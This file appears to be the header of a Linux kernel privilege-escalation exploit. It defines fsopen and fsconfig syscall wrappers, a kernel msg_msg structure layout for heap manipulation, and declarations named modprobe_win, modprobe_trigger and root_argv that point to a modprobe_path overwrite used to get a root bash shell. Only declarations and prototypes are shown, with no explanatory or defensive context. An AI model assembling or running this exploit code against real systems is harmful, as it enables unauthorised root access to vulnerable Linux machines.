#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <poll.h>
#include <assert.h>
#include <time.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/sched.h>

#define MSG_COPY        040000

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)
#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))

extern char *modprobe_win;
extern char *modprobe_trigger;
#define SHELL "/bin/bash"
extern char *root_argv[];

typedef struct
{
        long mtype;
        char mtext[1];
}msg;

typedef struct
{
    void *ll_next;
    void *ll_prev;
    long m_type;
    size_t m_ts;
    void *next;
    void *security;
}msg_header;

void hexprint(char *buffer, unsigned int bytes);
int32_t make_queue(key_t key, int msgflg);
ssize_t get_msg_no_err(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg);
ssize_t get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg);
void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg);
